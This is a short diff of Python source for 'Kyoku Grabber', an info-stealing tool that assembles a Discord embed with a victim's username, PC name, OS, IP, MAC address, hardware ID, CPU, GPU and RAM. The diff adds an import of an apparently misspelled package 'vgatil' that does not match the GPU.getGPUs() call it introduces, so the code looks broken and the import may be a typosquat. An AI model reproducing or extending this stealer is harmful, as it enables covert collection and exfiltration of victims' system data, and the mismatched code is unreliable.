@@ -4,6 +4,7 @@ import json
 import zlib
 import os
 import platform
+import vgatil
 import codecs
 import random
 import re
@@ -175,7 +176,7 @@ class PcInfo:
 
         embed.add_field(
             name="System Info",
-            value=f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
+            value=f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{GPU.getGPUs()}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
             inline=False)
         embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1083105927906988063/1087773715695153183/kyoku_logo.png")
         embed.set_footer(text="Kyoku Grabber | Created By errias")
